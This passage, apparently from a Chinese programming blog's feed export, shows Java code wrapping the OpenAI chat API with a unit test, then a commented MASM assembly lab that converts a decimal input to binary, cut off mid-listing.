class="built_in">this</span>.openAiApi.completions(chatCompletionRequest).blockingGet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="DefaultOpenAiSessionFactory"><a href="#DefaultOpenAiSessionFactory" class="headerlink" title="DefaultOpenAiSessionFactory"></a>DefaultOpenAiSessionFactory</h5><p>å®ç°OpenAiSessionFactoryæ¥å£,å…¶å®å®ç°çš„æ˜¯IOpenAiApiæ¥å£,è¿”å›ä¸€ä¸ªDefaultOpenAiSession(openAiApi)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultOpenAiSessionFactory</span> <span class="keyword">implements</span> <span class="title class_">OpenAiSessionFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Configuration configuration;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultOpenAiSessionFactory</span><span class="params">(Configuration configuration)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.configuration = configuration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> OpenAiSession <span class="title function_">openSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 1. æ—¥å¿—é…ç½®</span></span><br><span class="line">        <span class="type">HttpLoggingInterceptor</span> <span class="variable">httpLoggingInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpLoggingInterceptor</span>();</span><br><span class="line">        httpLoggingInterceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. å¼€å¯ Http å®¢æˆ·ç«¯</span></span><br><span class="line">        <span class="type">OkHttpClient</span> <span class="variable">okHttpClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span></span><br><span class="line">                .Builder()</span><br><span class="line">                .addInterceptor(httpLoggingInterceptor)</span><br><span class="line">                .addInterceptor(<span class="keyword">new</span> <span class="title class_">OpenAiInterceptor</span>(configuration.getApiKey(), configuration.getAuthToken()))</span><br><span class="line">                .connectTimeout(<span class="number">450</span>, TimeUnit.SECONDS)</span><br><span class="line">                .writeTimeout(<span class="number">450</span>, TimeUnit.SECONDS)</span><br><span class="line">                .readTimeout(<span class="number">450</span>, TimeUnit.SECONDS)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. å®ç°IOpenAiApiæ¥å£,åˆ›å»º API æœåŠ¡,å³ç½‘ç»œè¯·æ±‚æ¥å£å¯¹è±¡å®ä¾‹</span></span><br><span class="line">        <span class="type">IOpenAiApi</span> <span class="variable">openAiApi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Retrofit</span>.Builder()</span><br><span class="line">                .baseUrl(configuration.getApiHost())<span class="comment">//å¾—åˆ°url</span></span><br><span class="line">                .client(okHttpClient)<span class="comment">//è®¾ç½®å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="comment">//        RxJava2CallAdapterFactoryçš„ä¸»è¦ä½œç”¨æ˜¯ï¼š</span></span><br><span class="line"><span class="comment">//        1.å°†Androidçš„Callå¯¹è±¡è½¬æ¢ä¸ºRxJavaçš„Observableç±»å‹ã€‚</span></span><br><span class="line"><span class="comment">//        2.å¤„ç†Callçš„é”™è¯¯å’Œç»“æœï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºRxJavaçš„onErrorå’ŒonNextäº‹ä»¶ã€‚</span></span><br><span class="line"><span class="comment">//        3.æ·»åŠ é€‚å½“çš„é”™è¯¯å¤„ç†é€»è¾‘ï¼Œä¾‹å¦‚é‡è¯•ã€ç½‘ç»œé”™è¯¯ç­‰ã€‚</span></span><br><span class="line">                .addCallAdapterFactory(RxJava2CallAdapterFactory.create())</span><br><span class="line">                .addConverterFactory(JacksonConverterFactory.create())<span class="comment">//åœ¨è¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨jacksonåº“è¿›è¡Œjsonè½¬æ¢</span></span><br><span class="line">                .build().create(IOpenAiApi.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultOpenAiSession</span>(openAiApi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•å…ƒæµ‹è¯•"><a href="#å•å…ƒæµ‹è¯•" class="headerlink" title="å•å…ƒæµ‹è¯•"></a>å•å…ƒæµ‹è¯•</h3><p>ä¼ url,key,tokenå’Œrequestå°±è¡Œ</p><p><img src="https://pb01.s3.bitiful.net/44.png" alt="avatar"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> OpenAiSession openAiSession;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test_OpenAiSessionFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 1. é…ç½®æ–‡ä»¶</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        configuration.setApiHost(<span class="string">&quot;https://api.openai-proxy.com/&quot;</span>);</span><br><span class="line">        configuration.setApiKey(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        configuration.setAuthToken(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="comment">// 2. ä¼šè¯å·¥å‚</span></span><br><span class="line">        <span class="type">OpenAiSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultOpenAiSessionFactory</span>(configuration);</span><br><span class="line">        <span class="comment">// 3. å¼€å¯ä¼šè¯</span></span><br><span class="line">        <span class="built_in">this</span>.openAiSession = factory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ­¤å¯¹è¯æ¨¡å‹ 3.5 æ¥è¿‘äºå®˜ç½‘ä½“éªŒ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test_chat_completions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 1. åˆ›å»ºå‚æ•°</span></span><br><span class="line">        <span class="type">ChatCompletionRequest</span> <span class="variable">chatCompletion</span> <span class="operator">=</span> ChatCompletionRequest</span><br><span class="line">                .builder()</span><br><span class="line">                .messages(Collections.singletonList(Message.builder().role(Constants.Role.USER).content(<span class="string">&quot;å†™ä¸€ä¸ªjavaå†’æ³¡æ’åº&quot;</span>).build()))</span><br><span class="line">                .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())</span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">// 2. å‘èµ·è¯·æ±‚</span></span><br><span class="line">        <span class="type">ChatCompletionResponse</span> <span class="variable">chatCompletionResponse</span> <span class="operator">=</span> openAiSession.completions(chatCompletion);</span><br><span class="line">        <span class="comment">// 3. è§£æç»“æœ</span></span><br><span class="line">        chatCompletionResponse.getChoices().forEach(e -&gt; &#123;</span><br><span class="line">            log.info(<span class="string">&quot;æµ‹è¯•ç»“æœï¼š&#123;&#125;&quot;</span>, e.getMessage());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒäºŒ(è¯¦ç»†æ³¨é‡Šç‰ˆ)</title>
      <link href="/2023/12/02/2023-12-2-%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C2/"/>
      <url>/2023/12/02/2023-12-2-%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C2/</url>
      
        <content type="html"><![CDATA[<h3 id="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒäºŒ-è¯¦ç»†æ³¨é‡Šç‰ˆ"><a href="#è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒäºŒ-è¯¦ç»†æ³¨é‡Šç‰ˆ" class="headerlink" title="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒäºŒ(è¯¦ç»†æ³¨é‡Šç‰ˆ)"></a>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒäºŒ(è¯¦ç»†æ³¨é‡Šç‰ˆ)</h3><p><strong>ç¯å¢ƒ</strong>:VSCode+MASM/TASMæ’ä»¶(å»ºè®®ä½¿ç”¨ç›¸åŒç¯å¢ƒ,å­¦æ ¡æœºæˆ¿ç¯å¢ƒæœ‰ç‚¹è€,å¯èƒ½ä¼šå‡ºä¸€äº›å¥‡æ€ªçš„é—®é¢˜)</p><p><img src="https://pb01.s3.bitiful.net/32.png" alt="avatar"></p><h4 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h4><ol><li>è¾“å…¥ä¸€ä¸ªä¸è¶…è¿‡5ä½çš„åè¿›åˆ¶æ•°,å›è½¦ç»“æŸè¾“å…¥,å¹¶å°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°,è¾“å‡ºåˆ°å±å¹•ä¸Š</li><li>è¾“å…¥éæ•°å­—å­—ç¬¦,æŠ¥é”™,é‡æ–°è¾“å…¥</li><li>è¾“å…¥qæˆ–Q,ç»“æŸç¨‹åº</li><li>è¾“å…¥å­—ç¬¦ä¸²,ç©ºæ ¼ç»“æŸè¾“å…¥,ç»Ÿè®¡å­—ç¬¦ä¸²ä¸­æ•°å­—çš„ä¸ªæ•° <strong>(é€‰åš)</strong></li></ol><h4 id="åŸºç¡€ç‰ˆæœ¬-ä¸åš4"><a href="#åŸºç¡€ç‰ˆæœ¬-ä¸åš4" class="headerlink" title="åŸºç¡€ç‰ˆæœ¬(ä¸åš4)"></a>åŸºç¡€ç‰ˆæœ¬(ä¸åš4)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">_STACK SEGMENT PARA STACK&#x27;_STACK&#x27;</span><br><span class="line">DB 128 DUP(0)</span><br><span class="line">_STACK ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DATA SEGMENT</span><br><span class="line">    hello DB &#x27;Input a number or an instruction!!Q OR q: EXIT&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    wrong DB 0AH,0DH,&#x27;Wrong Input(only numbers!)&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    endofhex DB 0AH,0DH,&#x27;Binary:&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    finish DB 0AH,0DH,&#x27;Finished&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    got DB 5 DUP(0)</span><br><span class="line">DATA ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">assume cs:CODE,ds:DATA,ss:_STACK</span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line"></span><br><span class="line">beginofread:</span><br><span class="line">    mov ax,DATA</span><br><span class="line">    mov ds,ax</span><br><span class="line">    ;å–åç§»åœ°å€</span><br><span class="line">    mov dx,offset hello</span><br><span class="line">    ;æ˜¾ç¤ºå­—ç¬¦ä¸²</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">    ; æ¸…é›¶BX</span><br><span class="line">    mov bx,0H</span><br><span class="line">    ; åˆå§‹åŒ–DIå’ŒCX</span><br><span class="line">    mov di,offset got</span><br><span class="line">    mov cx,0H</span><br><span class="line">readchar:</span><br><span class="line">    ; è¯»å–å­—ç¬¦</span><br><span class="line">    mov ah,01H</span><br><span class="line">    int 21H</span><br><span class="line">    ; æ¯”è¾ƒBXæ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸æ˜¯ï¼Œè·³åˆ°notfirst</span><br><span class="line">    cmp bx,0H</span><br><span class="line">    jne notfirst</span><br><span class="line">    ; æ¯”è¾ƒALæ˜¯å¦ä¸ºQæˆ–qï¼Œå¦‚æœæ˜¯ï¼Œåˆ™é€€å‡ºç¨‹åº</span><br><span class="line">    cmp al,&#x27;Q&#x27;</span><br><span class="line">    je exit</span><br><span class="line">    cmp al,&#x27;q&#x27;</span><br><span class="line">    je exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">notfirst:</span><br><span class="line">;åˆ¤æ–­æ˜¯å¦åˆæ³•</span><br><span class="line">    mov bx,01H</span><br><span class="line">    call legalcheck</span><br><span class="line">;ä¸åˆæ³•é‡æ–°å¼€å§‹</span><br><span class="line">    cmp bx,02H</span><br><span class="line">    je beginofread</span><br><span class="line">;æ¢è¡Œè¾“å…¥ç»“æŸ</span><br><span class="line">    cmp bx,04H</span><br><span class="line">    je endofinput</span><br><span class="line"></span><br><span class="line">    jmp loadinmemory</span><br><span class="line"></span><br><span class="line">loadinmemory:</span><br><span class="line">;è¾“å…¥å­˜å…¥å†…å­˜</span><br><span class="line">    mov [di],al</span><br><span class="line">    inc cx</span><br><span class="line">    inc di</span><br><span class="line">    jmp readchar</span><br><span class="line"></span><br><span class="line">endofinput:</span><br><span class="line">;å–å‰5ä½</span><br><span class="line">    mov dx,0H</span><br><span class="line">    mov di,offset got</span><br><span class="line"></span><br><span class="line">;å°†æ•°å­—è½¬æ¢ä¸ºasciiç </span><br><span class="line">beginofhandle:</span><br><span class="line">    mov bx,0H</span><br><span class="line">    mov bl,[di]</span><br><span class="line">    ; å°†å¯„å­˜å™¨BXä¸­çš„å€¼å‡å»30H</span><br><span class="line">    sub bx,30H  </span><br><span class="line">    add dx,bx</span><br><span class="line">    ;å¤„ç†å®Œæ¯•</span><br><span class="line">    cmp cx,1H</span><br><span class="line">    je endofhandle</span><br><span class="line">    ;axæ¸…é›¶,ä¹˜10</span><br><span class="line">    call mulAHdxtodx</span><br><span class="line">    ;å¾…å¤„ç†å­—ç¬¦å‡ä¸€</span><br><span class="line">    dec cx</span><br><span class="line">    ;ä¸‹ä¸€ä½</span><br><span class="line">    inc di</span><br><span class="line">    jmp beginofhandle</span><br><span class="line"></span><br><span class="line">;è¾“å‡ºASCIIç </span><br><span class="line">endofhandle:</span><br><span class="line">;è¾“å‡º2è¿›åˆ¶</span><br><span class="line">    call binaryoutput</span><br><span class="line">;è·³è½¬é‡æ–°å¼€å§‹</span><br><span class="line">    jmp beginofread</span><br><span class="line"></span><br><span class="line">binaryoutput:</span><br><span class="line">    mov bx,dx</span><br><span class="line">    mov dx,0H</span><br><span class="line">    mov cx,10H ;å¾ªç¯16æ¬¡</span><br><span class="line">    ;å¼€å§‹å¾ªç¯</span><br><span class="line">beginofoutputloop:</span><br><span class="line">;å·¦ç§»1ä½</span><br><span class="line">    shl bx,1</span><br><span class="line">;ä¸è¿›ä½åˆ™è·³è½¬</span><br><span class="line">    jnc out0</span><br><span class="line">    mov dl,&#x27;1&#x27;</span><br><span class="line">    jmp outputdl</span><br><span class="line">out0:</span><br><span class="line">    mov dl,&#x27;0&#x27;</span><br><span class="line">outputdl:</span><br><span class="line">    mov ah,02H</span><br><span class="line">    int 21H</span><br><span class="line">    dec cx ;å¾ªç¯æ¬¡æ•°å‡1</span><br><span class="line">    cmp cx,0H ;åˆ¤æ–­å¾ªç¯æ˜¯å¦ç»“æŸ</span><br><span class="line">    jne beginofoutputloop</span><br><span class="line">    ;ç»“æŸå¾ªç¯,è¾“å‡ºç»“æŸè¯­å¥</span><br><span class="line">    mov dx,offset finish </span><br><span class="line">    mov ah,09H </span><br><span class="line">    int 21H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">legalcheck:</span><br><span class="line">;åˆ¤æ–­æ¢è¡Œ</span><br><span class="line">    cmp al,0DH</span><br><span class="line">    je endlegalnextline</span><br><span class="line">;åˆ¤æ–­æ•°å­—0-9</span><br><span class="line">    cmp al,30H</span><br><span class="line">    jb endlegalfalse</span><br><span class="line">    cmp al,39H</span><br><span class="line">    ja endlegalfalse</span><br><span class="line"></span><br><span class="line">endlegaltrue:</span><br><span class="line">    mov bx,03H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">endlegalnextline:</span><br><span class="line">    mov bx,04H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">endlegalfalse:</span><br><span class="line">;è¾“å‡ºwrongè¯­å¥</span><br><span class="line">    mov dx,offset wrong</span><br><span class="line">    mov ah,09H</span><br><span class="line">    int 21H</span><br><span class="line">;é‡æ–°å¼€å§‹ç¨‹åº</span><br><span class="line">    mov bx,02H</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mulAHdxtodx:</span><br><span class="line">    mov bx,0H</span><br><span class="line">    mov ax,0H</span><br><span class="line">    </span><br><span class="line">loopofmul:</span><br><span class="line">    add ax,dx</span><br><span class="line">    inc bx</span><br><span class="line">    cmp bx,0AH</span><br><span class="line">    jb loopofmul</span><br><span class="line">    mov dx,ax</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    mov ah,4CH</span><br><span class="line">    int 21H</span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœ:</strong></p><p><img src="https://pb01.s3.bitiful.net/34.png" alt="avatar"></p><h4 id="å®Œæ•´ç‰ˆ-å®éªŒç»“æŸåå®Œæˆ"><a href="#å®Œæ•´ç‰ˆ-å®éªŒç»“æŸåå®Œæˆ" class="headerlink" title="å®Œæ•´ç‰ˆ(å®éªŒç»“æŸåå®Œæˆ)"></a>å®Œæ•´ç‰ˆ(å®éªŒç»“æŸåå®Œæˆ)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">_STACK SEGMENT PARA STACK&#x27;_STACK&#x27;</span><br><span class="line">DB 128 DUP(0)</span><br><span class="line">_STACK ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DATA SEGMENT</span><br><span class="line">    hello DB &#x27;Input a number or an instruction!!Q OR q: EXIT,s:SEARCH&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    wrong DB 0AH,0DH,&#x27;Wrong Input(only numbers!)&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    endofhex DB 0AH,0DH,&#x27;Binary:&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    finish DB 0AH,0DH,&#x27;Finished&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    hello2 DB 0AH,0DH,&#x27;Search number inyour string. Space to end input&#x27;,0AH,0DH,&#x27;Input string:&#x27;,0AH,0DH,&#x27;$&#x27;</span><br><span class="line">    finish2 DB 0AH,0DH,&#x27;FINISHED!!!&#x27;,0AH,0DH,&#x27;THERE ARE &#x27;,&#x27;$&#x27;</span><br><span class="line">    finish3 DB &#x27; 